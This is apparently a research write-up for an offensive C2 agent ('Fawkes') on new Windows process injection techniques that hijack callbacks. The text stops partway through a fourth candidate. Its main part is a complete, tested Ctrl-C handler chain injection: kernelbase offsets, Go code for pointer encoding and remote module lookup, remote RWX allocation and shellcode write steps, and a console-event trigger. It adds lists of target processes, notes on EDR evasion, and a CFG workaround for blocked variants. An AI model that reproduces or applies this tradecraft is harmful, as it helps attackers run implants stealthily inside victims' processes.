# Opus Injection Research

Novel process injection techniques developed for the Fawkes agent, focusing on unexplored callback mechanisms in Windows.

## Overview

The "Opus Injection" family of techniques explores Windows callback mechanisms that haven't been weaponized in common tooling. The goal is to find function pointer structures in target processes that can be manipulated to achieve code execution through legitimate Windows API triggers.

**Key Advantage:** These techniques avoid commonly monitored APIs like `CreateRemoteThread`, `QueueUserAPC`, and thread pool manipulation, presenting a different detection surface.

---

## Variant 1: Ctrl-C Handler Chain Injection

### Executive Summary

This technique hijacks the Windows console control handler mechanism to achieve code execution. By injecting a fake handler into the target process's handler array and triggering a console control event, Windows itself executes our shellcode as part of its normal handler dispatch routine.

**Status:** ✅ Implemented and tested
**Target:** Console processes only
**Shellcode:** Position-independent code (C-based agents, msfvenom, Cobalt Strike)

### Background: How Console Control Handlers Work

When a Windows console application calls `SetConsoleCtrlHandler()`, it registers a callback function that gets invoked when console events occur (Ctrl+C, Ctrl+Break, console close, logoff, shutdown). The handler signature is:

```c
typedef BOOL (WINAPI *PHANDLER_ROUTINE)(DWORD dwCtrlType);
```

Where `dwCtrlType` is one of:
- `CTRL_C_EVENT` (0) - Ctrl+C pressed
- `CTRL_BREAK_EVENT` (1) - Ctrl+Break pressed
- `CTRL_CLOSE_EVENT` (2) - Console window closing
- `CTRL_LOGOFF_EVENT` (5) - User logging off
- `CTRL_SHUTDOWN_EVENT` (6) - System shutting down

When an event occurs, Windows walks the handler list and calls each registered handler until one returns `TRUE` (handled) or the list is exhausted.

### Internal Structure Discovery

Through reverse engineering with WinDbg, we discovered that the handler list is **not** a linked list as one might assume, but rather a **heap-allocated array of encoded function pointers**.

#### Key Global Variables in kernelbase.dll

```
kernelbase!HandlerList              @ RVA 0x399490  - Pointer to heap-allocated array
kernelbase!HandlerListLength        @ RVA 0x39CBB0  - Current number of handlers (DWORD)
kernelbase!AllocatedHandlerListLength @ RVA 0x39CBB4  - Array capacity (DWORD)
kernelbase!SingleHandler            @ RVA 0x39CBA8  - Optimization for single handler
kernelbase!ConsoleStateLock         @ RVA 0x39CC00  - Critical section (we bypass this)
```

**Note:** These RVA offsets were determined on Windows 11 23H2/24H2. They may differ on other Windows versions.

#### Memory Layout

```
kernelbase.dll + 0x399490:  [Pointer to Handler Array] ──────┐
                                                              │
                                                              ▼
Heap Memory:                ┌─────────────────────────────────────────┐
                            │ EncodedHandler[0]  (8 bytes, encoded)   │
                            │ EncodedHandler[1]  (8 bytes, encoded)   │
                            │ EncodedHandler[2]  (8 bytes, encoded)   │
                            │ ...                                     │
                            │ EncodedHandler[n]  (8 bytes, encoded)   │
                            │ [unused capacity]                       │
                            └─────────────────────────────────────────┘

kernelbase.dll + 0x39CBB0:  [HandlerListLength = n+1]  (DWORD)
kernelbase.dll + 0x39CBB4:  [AllocatedLength = capacity]  (DWORD)
```

### Critical Detail: Pointer Encoding

**This is the most important implementation detail.** Handler pointers are NOT stored as raw addresses. They are encoded using `RtlEncodePointer` to prevent simple pointer overwrites.

#### RtlEncodePointer Algorithm

```c
// Encoding: (pointer XOR cookie) ROR (cookie & 0x3F)
PVOID RtlEncodePointer(PVOID Pointer) {
    ULONG Cookie = GetProcessCookie();  // 32-bit value
    ULONG_PTR Result = (ULONG_PTR)Pointer ^ Cookie;
    ULONG RotateAmount = Cookie & 0x3F;  // 0-63 bits
    Result = RotateRight(Result, RotateAmount);
    return (PVOID)Result;
}

// Decoding: ROL (encoded, cookie & 0x3F) XOR cookie
PVOID RtlDecodePointer(PVOID Encoded) {
    ULONG Cookie = GetProcessCookie();
    ULONG_PTR Result = (ULONG_PTR)Encoded;
    ULONG RotateAmount = Cookie & 0x3F;
    Result = RotateLeft(Result, RotateAmount);
    Result ^= Cookie;
    return (PVOID)Result;
}
```

#### Retrieving the Process Cookie

The process cookie is a per-process random value generated at process creation. It can be retrieved via:

```c
// NtQueryInformationProcess with ProcessCookie (info class 36)
ULONG Cookie;
ULONG ReturnLength;
NtQueryInformationProcess(
    hProcess,
    ProcessCookie,  // 36
    &Cookie,
    sizeof(Cookie),
    &ReturnLength
);
```

**Important:** The cookie is a 32-bit DWORD value, even on 64-bit systems. Do NOT confuse this with the value at PEB+0x78, which is the TlsBitmap pointer.

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        OPUS INJECTION VARIANT 1                         │
│                    Ctrl-C Handler Chain Injection                       │
└─────────────────────────────────────────────────────────────────────────┘

Step 1: Open Target Process
    ├── OpenProcess() with VM_READ | VM_WRITE | VM_OPERATION | QUERY_INFORMATION
    └── Target must be a console process

Step 2: Locate kernelbase.dll
    ├── EnumProcessModulesEx() to enumerate loaded modules
    └── Find kernelbase.dll base address in target

Step 3: Calculate Structure Addresses
    ├── HandlerList pointer    = kernelbase + 0x399490
    ├── HandlerListLength      = kernelbase + 0x39CBB0
    └── AllocatedHandlerLength = kernelbase + 0x39CBB4

Step 4: Read Current State
    ├── Read HandlerList pointer → get heap array address
    ├── Read HandlerListLength   → current handler count
    ├── Read AllocatedLength     → array capacity
    └── Verify: count < capacity (room for new handler)

Step 5: Get Process Cookie
    ├── NtQueryInformationProcess(ProcessCookie)
    └── Returns 32-bit cookie value

Step 6: Allocate Shellcode Memory
    ├── VirtualAllocEx() with PAGE_EXECUTE_READWRITE
    └── Get shellcode address in target process

Step 7: Write Shellcode
    └── WriteProcessMemory() shellcode to allocated region

Step 8: Encode Shellcode Address
    ├── encoded = shellcode_addr XOR cookie
    └── encoded = RotateRight(encoded, cookie & 0x3F)

Step 9: Install Handler
    ├── Calculate target slot: HandlerArray + (HandlerListLength * 8)
    └── WriteProcessMemory() encoded pointer to slot

Step 10: Update Handler Count
    └── WriteProcessMemory() increment HandlerListLength

Step 11: Trigger Execution
    ├── FreeConsole()           → Detach from our console
    ├── AttachConsole(pid)      → Attach to target's console
    ├── GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)  → Trigger handlers
    ├── FreeConsole()           → Detach from target
    └── AllocConsole()          → Restore our console

Step 12: Execution
    └── Windows decodes our pointer and calls shellcode as a handler!
```

### Implementation Details

#### Finding kernelbase.dll in Remote Process

```go
func findModuleInProcess(hProcess windows.Handle, moduleName string) (uintptr, error) {
    var modules [1024]windows.Handle
    var needed uint32

    err := windows.EnumProcessModulesEx(
        hProcess,
        &modules[0],
        uint32(len(modules)*8),
        &needed,
        windows.LIST_MODULES_ALL,
    )
    if err != nil {
        return 0, err
    }

    numModules := needed / 8
    for i := uint32(0); i < numModules; i++ {
        var modName [260]uint16
        windows.GetModuleBaseName(hProcess, modules[i], &modName[0], 260)
        name := windows.UTF16ToString(modName[:])
        if strings.EqualFold(name, moduleName) {
            return uintptr(modules[i]), nil
        }
    }
    return 0, fmt.Errorf("module not found")
}
```

#### Pointer Encoding Implementation

```go
func encodePointer(ptr uintptr, cookie uint32) uintptr {
    // XOR with cookie (zero-extended to 64-bit on x64)
    result := ptr ^ uintptr(cookie)

    // Rotate right by (cookie & 0x3F) bits
    rotateAmount := cookie & 0x3F
    if rotateAmount > 0 {
        result = (result >> rotateAmount) | (result << (64 - rotateAmount))
    }

    return result
}
```

#### Triggering the Handler

The key insight for automatic triggering:

```go
// After AttachConsole(pid), we're attached to the TARGET's console
// Process group 0 means "all processes on current console"
// So this sends Ctrl+C to the target, not to us!
procFreeConsole.Call()                           // Detach from our console
procAttachConsole.Call(uintptr(pid))             // Attach to target's console
procGenerateConsoleCtrlEvent.Call(CTRL_C_EVENT, 0)  // Trigger on current console
procFreeConsole.Call()                           // Detach from target
procAllocConsole.Call()                          // Restore our console
```

### Viable Targets

Any process with an attached console is a potential target. A process has a console if it has `conhost.exe` as a child/related process or was created with `ALLOC_CONSOLE`/`ATTACH_PARENT_CONSOLE`.

| Category | Processes | Notes |
|----------|-----------|-------|
| **Shells** | `cmd.exe`, `powershell.exe`, `pwsh.exe` | Almost always present on workstations |
| **Terminal Apps** | `WindowsTerminal.exe`, `ConEmu.exe`, `cmder.exe` | Developer machines |
| **Scripting Runtimes** | `python.exe`, `python3.exe`, `node.exe`, `ruby.exe`, `perl.exe` | Dev environments, some servers |
| **Java** | `java.exe`, `javaw.exe` (if console) | Enterprise environments |
| **Package Managers** | `npm.exe`, `pip.exe`, `choco.exe`, `winget.exe` | While running |
| **Build Tools** | `msbuild.exe`, `devenv.exe` (CLI mode), `gradle.exe` | CI/CD, dev machines |
| **Database CLIs** | `sqlcmd.exe`, `mysql.exe`, `psql.exe`, `mongo.exe` | Database servers |
| **Git** | `git.exe`, `git-bash.exe` | Very common on dev machines |
| **SSH/Remote** | `ssh.exe`, `putty.exe` (CLI), `openssh-server` | IT admin machines |
| **Sysadmin Tools** | `wmic.exe`, `netsh.exe` (if interactive) | While running |
| **Servers** | `nginx.exe`, `httpd.exe`, `redis-server.exe` | If started from console |
| **Monitoring/Agents** | Various backup agents, monitoring tools | Check target environment |

**Best Persistent Targets:**
- Long-running scripts (Python/Node services, scheduled tasks)
- Interactive shells (admin left PowerShell window open)
- Development servers (`npm start`, `python manage.py runserver`)
- Database connections (`sqlcmd` sessions, `mysql` clients)

### Shellcode Compatibility

| Shellcode Type | Compatible | Tested | Notes |
|----------------|------------|--------|-------|
| calc.bin (simple PIC) | ✅ Yes | ✅ Confirmed | Works reliably |
| msfvenom payloads | ✅ Yes | Expected | Standard PIC shellcode |
| Cobalt Strike | ✅ Yes | Expected | C-based, standard PIC |
| Xenon (C-based agent) | ✅ Yes | ✅ Confirmed | C-based Mythic agent works |
| Havoc | ✅ Yes | Expected | C-based |
| Brute Ratel | ✅ Yes | Expected | C-based |
| Go-based (Fawkes, Merlin, Sliver) | ❌ No | ✅ Confirmed fails | Go runtime needs TLS, stack setup |
| .NET/C# (Apollo) | ❌ No | ✅ Confirmed fails | CLR needs managed environment |

#### Why Runtime-Dependent Shellcode Fails

The Ctrl+C handler callback executes in a constrained context. Windows expects a simple function that:
1. Receives a single DWORD parameter (control type)
2. Returns a BOOL (TRUE if handled, FALSE to continue chain)
3. Executes quickly and returns

Complex runtimes like Go and .NET require:
- Thread Local Storage (TLS) properly initialized
- Stack cookies/canaries
- Exception handling chains (SEH/VEH)
- Runtime/GC initialization
- Managed execution environment

The callback context provides none of this infrastructure, causing runtime-dependent shellcode to crash or fail initialization.

### Limitations

- **Console processes only** - GUI applications without consoles are not viable targets
- **Target must have active console** - Detached or no-console processes won't work
- **Windows version dependent** - RVA offsets may differ across Windows versions
- **Runtime-dependent shellcode incompatible** - Go, .NET, and similar runtimes fail

### Console Restoration

After injection, the attacking process loses its original console due to `FreeConsole()`/`AttachConsole()` operations. The implementation calls `AllocConsole()` afterward to restore console functionality, though this creates a new console rather than re-attaching to the original.

### Detection Surface

| Action | API | Detection Likelihood |
|--------|-----|---------------------|
| Open target process | `OpenProcess` | Standard - commonly monitored |
| Enumerate modules | `EnumProcessModulesEx` | Low - legitimate usage common |
| Query process info | `NtQueryInformationProcess` | Low - legitimate usage common |
| Allocate remote memory | `VirtualAllocEx` | **High** - commonly monitored |
| Write remote memory | `WriteProcessMemory` | **High** - commonly monitored |
| Attach to console | `AttachConsole` | **Low** - rarely monitored |
| Generate console event | `GenerateConsoleCtrlEvent` | **Low** - rarely monitored |

**Advantages over traditional injection:**
- No `CreateRemoteThread` - avoids heavily monitored API
- No `QueueUserAPC` - avoids APC-based detection
- No thread pool manipulation - avoids PoolParty-style detection
- No DLL injection - no `LoadLibrary` calls
- No thread context manipulation - no `SetThreadContext`/`GetThreadContext`

**Potential detection opportunities:**
- Cross-process `WriteProcessMemory` to kernelbase.dll data sections
- `AttachConsole` followed immediately by `GenerateConsoleCtrlEvent`
- Process with no visible console window calling console APIs
- Modification of handler count without corresponding `SetConsoleCtrlHandler` call

### Reversing Notes

#### WinDbg Commands Used

```
# Find HandlerList symbol
x kernelbase!*handler*

# Examine SetConsoleCtrlHandler
uf kernelbase!SetConsoleCtrlHandler

# Check handler array
dq kernelbase!HandlerList L1
dq poi(kernelbase!HandlerList) L8

# Check handler count
dd kernelbase!HandlerListLength L1
dd kernelbase!AllocatedHandlerListLength L1

# Examine RtlEncodePointer
uf ntdll!RtlEncodePointer

# Get process cookie
!peb  # Look for cookie or use NtQueryInformationProcess
```

#### Key Findings from Reversing

1. Handler list is an array, not a linked list (simpler than expected)
2. Handlers are encoded with `RtlEncodePointer` (XOR + ROR)
3. Process cookie retrieved via `NtQueryInformationProcess(ProcessCookie)`, NOT from PEB
4. Cookie is 32-bit even on 64-bit systems
5. `ConsoleStateLock` critical section exists but can be bypassed for single writes
6. Array grows dynamically when capacity exceeded (we don't handle this case)

---

## Variant 2: WNF (Windows Notification Facility) Callback Injection

### Concept

WNF is an obscure publish/subscribe notification system in Windows used internally by OS components. Subscribers register callbacks that fire when state changes occur.

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

### Key Findings from Reversing

#### Global WNF Context Location

```
ntdll!LdrpThunkSignature+0x258:  [RtlRunOnce guard - one-time init]
ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] → Heap structure
```

The WNF subscription root is stored at a fixed offset from `ntdll!LdrpThunkSignature+0x260`.

#### Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     WNF SUBSCRIPTION ARCHITECTURE                        │
└─────────────────────────────────────────────────────────────────────────┘

ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] ──────┐
                                                              │
                                                              ▼
                                    ┌─────────────────────────────────┐
                                    │       WNF Context Structure      │
                                    │  +0x10: List head pointer        │
                                    │  +0x18: First entry / encoded    │
                                    └─────────────────────────────────┘
                                                   │
                                                   ▼
                         ┌─────────────────────────────────────────────┐
                         │         WNF_NAME_SUBSCRIPTION               │
                         │  (Keyed by WNF_STATE_NAME - 64-bit ID)      │
                         │  Contains linked list of user subscriptions │
                         └─────────────────────────────────────────────┘
                                          │
                    ┌─────────────────────┼─────────────────────┐
                    ▼                     ▼                     ▼
        ┌───────────────────┐  ┌───────────────────┐  ┌───────────────────┐
        │ WNF_USER_SUB      │  │ WNF_USER_SUB      │  │ WNF_USER_SUB      │
        │ +0x18: Info ptr   │  │                   │  │                   │
        │ +0x20: RefCount   │  │                   │  │                   │
        │ +0x28: Callback   │  │                   │  │                   │
        │ +0x30: Context    │  │                   │  │                   │
        │ +0x38: SubProcTag │  │                   │  │                   │
        │ +0x50: SerialGrp  │  │                   │  │                   │
        └───────────────────┘  └───────────────────┘  └───────────────────┘
```

#### Key Functions

| Function | Purpose |
|----------|---------|
| `RtlSubscribeWnfStateChangeNotification` | Main subscription API |
| `RtlpSubscribeWnfStateChangeNotificationInternal` | Internal implementation |
| `RtlpCreateWnfUserSubscription` | Creates user subscription entry |
| `RtlpCreateWnfNameSubscription` | Creates name subscription |
| `RtlpAddWnfUserSubToNameSub` | Links user sub to name sub |
| `RtlpWnfWalkUserSubscriptionList` | **Callback dispatcher** - walks and invokes |
| `RtlpGetFirstWnfNameSubscription` | Iterator for name subscriptions |
| `NtUpdateWnfStateData` | **Trigger** - publishing data invokes callbacks |

#### Critical Blocker: CFG Protection

From `RtlpWnfWalkUserSubscriptionList`:
```asm
mov rax, rsi                                    ; rsi = callback pointer
call ntdll!guard_dispatch_icall$thunk$...       ; CFG-protected indirect call
```

**All WNF callbacks are protected by Control Flow Guard (CFG).** Overwriting a callback pointer with shellcode will fail CFG validation and crash the process.

#### Potential CFG Workaround

`SetProcessValidCallTargets` can add addresses to the CFG bitmap:
```c
// kernelbase!SetProcessValidCallTargets calls:
NtSetInformationVirtualMemory(
    hProcess,
    VmCfgCallTargetInformation,  // Info class 2
    ...
);
```

This would require:
1. Opening target process with appropriate access
2. Calling SetProcessValidCallTargets to whitelist shellcode address
3. Then performing injection

**Downside:** Adds another uncommon API call to detection surface.

### WinDbg Commands Used

```
x ntdll!*Wnf*                                    # Find WNF symbols
uf ntdll!RtlSubscribeWnfStateChangeNotification  # Subscription flow
uf ntdll!RtlpWnfWalkUserSubscriptionList         # Callback dispatch
uf ntdll!RtlpGetFirstWnfNameSubscription         # Find global context
dq ntdll!LdrpThunkSignature+0x260 L1             # WNF context pointer
```

### Conclusion

WNF injection is **theoretically possible** but blocked by CFG. Would require SetProcessValidCallTargets workaround, adding complexity and detection surface. **Not recommended** unless CFG workaround becomes necessary for other reasons.

---

## Variant 3: FLS (Fiber Local Storage) Callback Injection

### Concept

Fiber Local Storage allows associating data with fibers/threads, with optional cleanup callbacks when slots are freed or threads exit.

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

### Key Findings from Reversing

#### Global FLS Context Location

```
ntdll!RtlpFlsContext (00007ffd`f83ede30)  - Global FLS context
TEB+0x17c8: FlsData                       - Per-thread FLS data pointer
```

#### Key Functions

| Function | Purpose |
|----------|---------|
| `RtlFlsAlloc` / `RtlFlsAllocEx` | Allocate FLS slot with optional callback |
| `RtlFlsFree` | Free slot, triggers cleanup callbacks |
| `RtlpFlsFree` | Internal implementation |
| `RtlFlsSetValue` / `RtlFlsGetValue` | Set/get FLS values |
| `RtlpFlsDataCleanup` | Thread exit cleanup |
| `RtlProcessFlsData` | Process FLS data |

#### Data Structures

```
RTL_BINARY_ARRAY<RTLP_FLS_CALLBACK_ENTRY,8,4>  - Callback storage
RTL_BINARY_ARRAY<RTLP_FLS_SLOT,8,4>            - Slot storage
```

FLS uses a "binary array" structure (tree-like array) rather than simple linear array.

#### Critical Blocker: CFG Protection

From `RtlpFlsFree`:
```asm
ntdll!RtlpFlsFree+0x10a:
    mov     rcx, qword ptr [rsi+8]              ; Load callback pointer
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG-protected!

ntdll!RtlpFlsFree+0x1d0:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG-protected!
```

**All FLS callbacks are also protected by Control Flow Guard (CFG).** Same blocker as WNF.

### WinDbg Commands Used

```
x ntdll!*Fls*                    # Find FLS symbols
x ntdll!*fls*                    # Case variations
uf ntdll!RtlFlsFree              # Main free function
uf ntdll!RtlpFlsFree             # Internal implementation
dt ntdll!_TEB FlsData            # TEB offset for FLS data
```

### Conclusion

FLS injection is **theoretically possible** but blocked by CFG, same as WNF. No advantage over WNF for injection purposes.

---

## Variant 2 & 3 Summary: CFG Blocking Both

Both WNF and FLS callback mechanisms are protected by Control Flow Guard (CFG) on modern Windows. This means:

1. **Cannot simply overwrite callback pointers** - CFG will validate and crash
2. **Workaround exists** - SetProcessValidCallTargets can whitelist addresses
3. **Adds detection surface** - Additional unusual API call
4. **Complexity increase** - More code, more failure points

### Comparison Table

| Factor | Variant 1 (Ctrl-C) | Variant 2 (WNF) | Variant 3 (FLS) | Candidate C (ExFilter) | Candidate A (TxnScope) |
|--------|-------------------|-----------------|-----------------|------------------------|------------------------|
| **CFG Protected** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes | N/A |
| **Structure Complexity** | Low (array) | High (nested) | Medium (binary array) | Low (single pointer) | N/A |
| **Global Context** | kernelbase.dll | ntdll.dll | ntdll.dll | kernelbase.dll | TEB (per-thread) |
| **Target Scope** | Console only | All processes | All processes | All processes | N/A |
| **Trigger** | Ctrl+C event | NtUpdateWnfStateData | FlsFree / thread exit | Unhandled exception | N/A |
| **Implementation** | ✅ Complete | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Vestigial (unused) |
| **Failure Reason** | - | CFG validation | CFG validation | CFG validation | Callbacks never invoked |

### Recommendation

**Variant 1 (Ctrl-C Handler) remains the only viable callback injection without CFG bypass.**

For future work, if CFG bypass becomes available or acceptable:
- WNF would target more processes but has complex structures
- FLS would be simpler but still requires CFG workaround
- Exception Filter would be simplest (single pointer) but same CFG blocker

**Candidate A (TxnScope) is NOT a CFG issue** - the callbacks simply don't exist as functional mechanisms. They appear to be reserved/vestigial TEB fields that Windows never implemented.

---

## Future Variant Ideas (Previously Documented)

### PEB KernelCallbackTable
- Win32k callbacks stored in PEB
- Used by FinFisher/Lazarus but still relatively novel
- Requires triggering specific win32k operations

### Vectored Exception Handler Injection
- VEH list in ntdll (LdrpVectorHandlerList)
- Add entry, cause exception, handler fires
- Complex but powerful

### ALPC Callback Injection
- ALPC ports have completion callbacks
- Very complex, requires deep ALPC knowledge

---

## Novel Research Candidates (Unexplored)

The following techniques are based on analysis of Windows internals structures that appear to have function pointers or callback mechanisms that haven't been publicly weaponized. These are candidates for future research.

### Why These Might Work

Our research on Variants 1-3 revealed:
- **CFG is the main blocker** for callback-based injection on modern Windows
- **Older/obscure mechanisms may predate CFG** and not be protected
- **Per-thread structures (TEB)** are interesting because they're per-thread writable
- **Exception handling paths** often have different protection characteristics

---

### Candidate A: TEB Transaction Scope Callbacks

#### Concept

The Thread Environment Block (TEB) contains function pointers for transactional operation callbacks:

```
TEB Structure (from WinDbg dt ntdll!_TEB):
   +0x17F0 TxnScopeEnterCallback : Ptr64 Void
   +0x17F8 TxnScopeExitCallback  : Ptr64 Void
   +0x1800 TxnScopeContext       : Ptr64 Void
```

### Status: Research Complete - **VESTIGIAL/UNUSED** (Not Viable)

#### Key Findings from Reversing

##### No Symbols for TxnScope Functions

```
0:029> x ntdll!*TxnScope*
[no results]
```

No exported functions manipulate these TEB fields directly. Only transaction handle functions exist:
- `RtlSetCurrentTransaction` - writes to TEB+0x17B8 (transaction HANDLE, not callbacks)
- `RtlGetCurrentTransaction` - reads from TEB+0x17B8

##### All Threads Have NULL Values

```
0:029> ~*e dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback @$teb
   +0x17f0 TxnScopeEnterCallback : (null)
   +0x17f8 TxnScopeExitCallback  : (null)
[repeated for all 30 threads - ALL NULL]
```

##### Thread Pool Only CHECKS These Fields (Never Calls)

Found references via byte pattern search `s -b ntdll L?500000 F0 17 00 00`:

| Address | Function | Purpose |
|---------|----------|---------|
| `TppCallbackCheckThreadBeforeCallback+0x6d` | Validation check |
| `TppWorkerThread+0x8c0` | Validation check |
| `TppWorkerThread+0x9d2` | Validation check |
| `TppCallbackCheckThreadAfterCallback+0x1ca` | Validation + raise exception |

The code only **compares** these fields against zero:
```asm
; TppWorkerThread checking TxnScope fields
cmp     qword ptr [rcx+17F0h],0   ; Is TxnScopeEnterCallback set?
jne     ...                        ; If yes, set validation flag
cmp     qword ptr [rcx+17F8h],0   ; Is TxnScopeExitCallback set?
jne     ...                        ; If yes, set validation flag
cmp     qword ptr [rcx+1800h],0   ; Is TxnScopeContext set?
jne     ...                        ; If yes, set validation flag
```

In `TppCallbackCheckThreadAfterCallback`, if these are unexpectedly set after a callback:
```asm
cmp     qword ptr [rcx+17F0h],rsi  ; rsi = 0
jne     +0x33f                      ; Jump to RtlRaiseException!
```

**The thread pool raises an exception if these are set** - they're used for state leak detection, not callback invocation.

##### CreateProcessInternalW - False Positive

Initial search hit in kernelbase was a **false positive**:
```asm
mov     qword ptr [rsp+17F0h],rax    ; STACK offset, not TEB!
mov     qword ptr [rsp+17F8h],1      ; Building struct on stack
```

The byte pattern 0x17F0 matched because it appears in stack-relative addressing, not TEB access.

##### Thread Pool Callbacks ARE CFG Protected

While investigating, confirmed that actual thread pool callback invocation uses CFG:
```asm
ntdll!TppWorkerThread+0x59b:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG PROTECTED

ntdll!TppWorkerThread+0x81b:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG PROTECTED
```

#### Conclusion

TxnScope callback fields are **vestigial/reserved** in the TEB:

1. **Never invoked** - No user-mode code calls these callbacks
2. **Validation only** - Thread pool checks they're NULL as sanity check
3. **No setter functions** - No API exists to populate these fields
4. **Exception on unexpected state** - Having these set triggers exceptions

**NOT VIABLE** for injection - these fields exist in the structure but are not functional callback mechanisms.

#### WinDbg Commands Used

```
# Check TEB fields
dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback TxnScopeContext @$teb

# Search for symbols
x ntdll!*TxnScope*
x ntdll!*Transaction*

# Binary search for code referencing offset 0x17F0
s -b ntdll L?500000 F0 17 00 00

# Identify containing functions
ln <address>

# Disassemble key functions
uf ntdll!TppWorkerThread
uf ntdll!TppCallbackCheckThreadBeforeCallback
uf ntdll!TppCallbackCheckThreadAfterCallback
```

---

### Candidate B: TEB ActiveFrame Chain Injection

#### Concept

The TEB contains a linked list of "active frames":

```
TEB Structure:
   +0x17C0 ActiveFrame : Ptr64 _TEB_ACTIVE_FRAME
```

The `_TEB_ACTIVE_FRAME` structure forms a stack of context frames:

```c
typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;
```

#### Attack Theory

```
1. Understand what walks/processes the ActiveFrame chain
2. Allocate fake TEB_ACTIVE_FRAME structure in target
3. Inject it into the chain (modify TEB+0x17C0)
4. If processing involves callbacks or function pointers, hijack those
5. Trigger whatever processes the frame chain
```

#### Why This Might Be Interesting

- **Linked list manipulation**: Similar to other list-based injections
- **Per-thread**: Each thread has its own frame chain
- **Unknown processing**: Need to research what uses this

#### Research Questions

- [ ] What code walks the ActiveFrame chain?
- [ ] Are there any callbacks associated with frame processing?
- [ ] What are common FrameName values?
- [ ] When are frames pushed/popped?

#### WinDbg Investigation Commands

```
# Check current thread's active frame
dt ntdll!_TEB ActiveFrame @$teb
dt ntdll!_TEB_ACTIVE_FRAME poi(@$teb+0x17c0)

# Find functions that manipulate active frames
x ntdll!*ActiveFrame*
x ntdll!RtlPush*
x ntdll!RtlPop*
```

#### Complexity Assessment

- **Implementation**: High - need to understand frame semantics
- **Trigger**: Unknown
- **Detection**: Unknown

---

### Candidate C: RtlpUnhandledExceptionFilter Hijacking

#### Concept

ntdll contains a global unhandled exception filter pointer. When an exception goes unhandled through SEH/VEH, this filter gets called as a last resort.

```c
// Global in ntdll
PTOP_LEVEL_EXCEPTION_FILTER RtlpUnhandledExceptionFilter;

// Callback signature
LONG WINAPI UnhandledExceptionFilter(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
);
```

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

#### Key Findings from Reversing

##### Global Filter Location and Encoding

```
ntdll!RtlpUnhandledExceptionFilter @ 00007ffa`0bd32948
Current encoded value: c74ec280`001ffeae
```

The filter pointer IS encoded using RtlEncodePointer, same as Ctrl-C handlers:

```asm
; From ntdll!RtlSetUnhandledExceptionFilter:
call    ntdll!RtlEncodePointer           ; Encode the filter pointer
mov     qword ptr [ntdll!RtlpUnhandledExceptionFilter],rax  ; Store encoded
```

##### Exception Dispatch Flow

```
KiUserExceptionDispatcher
    └──> RtlDispatchException
            └──> [SEH/VEH handling attempts]
                    └──> UnhandledExceptionFilter (kernelbase)
                            └──> Calls user's filter (CFG PROTECTED!)
```

##### Critical Blocker: CFG Protection

The user's exception filter is called from `kernelbase!UnhandledExceptionFilter`, NOT directly from ntdll. The call site IS CFG protected:

```asm
KERNELBASE!UnhandledExceptionFilter+0x13e:
    mov     rcx,qword ptr [KERNELBASE!BasepCurrentTopLevelFilter ...]
    call    qword ptr [KERNELBASE!_imp_RtlDecodePointer ...]
    mov     rsi,rax                           ; rsi = decoded filter pointer

; ... later at +0x1F8:
KERNELBASE!UnhandledExceptionFilter+0x1F8:
    mov     rcx,r15                           ; rcx = EXCEPTION_POINTERS
    mov     rax,rsi                           ; rax = decoded filter
    call    KERNELBASE!guard_dispatch_icall$thunk$10345483385596137414  ; CFG PROTECTED!
```

**The indirect call at offset 0x1FE uses `guard_dispatch_icall`**, which validates the target address against the CFG bitmap before allowing the call.

##### Two Filter Locations

There are actually TWO copies of the filter pointer:
1. `ntdll!RtlpUnhandledExceptionFilter` - ntdll's copy
2. `KERNELBASE!BasepCurrentTopLevelFilter` - kernelbase's copy (used for actual call)

Both are encoded, and the call through BasepCurrentTopLevelFilter is CFG protected.

#### Why This Technique Fails

Even if we:
1. Get the process cookie via NtQueryInformationProcess(ProcessCookie)
2. Encode our shellcode pointer correctly using RtlEncodePointer algorithm
3. Overwrite either RtlpUnhandledExceptionFilter or BasepCurrentTopLevelFilter

CFG will block the indirect call to our shellcode because:
- Shellcode address is not in an approved CFG region
- `guard_dispatch_icall` validates before calling
- Process will crash or filter call will fail

#### WinDbg Commands Used

```
# Find the global filter and its value
x ntdll!RtlpUnhandledExceptionFilter
dq ntdll!RtlpUnhandledExceptionFilter L1

# Find kernelbase's copy
x kernelbase!*TopLevel*
x kernelbase!*Filter*

# Examine the call site (this revealed CFG protection)
uf kernelbase!UnhandledExceptionFilter

# Key finding at offset 0x1FE:
# call    KERNELBASE!guard_dispatch_icall$thunk$...
```

#### Potential CFG Workaround

Same as WNF/FLS - would require `SetProcessValidCallTargets`:
```c
NtSetInformationVirtualMemory(
    hProcess,
    VmCfgCallTargetInformation,  // Info class 2
    ...
);
```

This adds detection surface and complexity.

#### Conclusion

RtlpUnhandledExceptionFilter hijacking is **blocked by CFG**, same as WNF and FLS. The exception filter callback mechanism, despite being older, has been retrofitted with CFG protection in the `kernelbase!UnhandledExceptionFilter` implementation.

**NOT VIABLE** without CFG bypass.

---

### Candidate D: LdrpDllNotificationList Injection

#### Concept

When DLLs load/unload, ntdll walks a notification list and calls registered callbacks. The list is:

```
ntdll!LdrpDllNotificationList - Linked list of notification entries
```

Each entry contains a callback function pointer that's called on DLL events.

#### Attack Theory

```
1. Find LdrpDllNotificationList head in target's ntdll
2. Allocate fake notification entry with our shellcode as callback
3. Insert entry into the list (manipulate Flink/Blink pointers)
4. Trigger DLL load in target:
   - LoadLibrary call
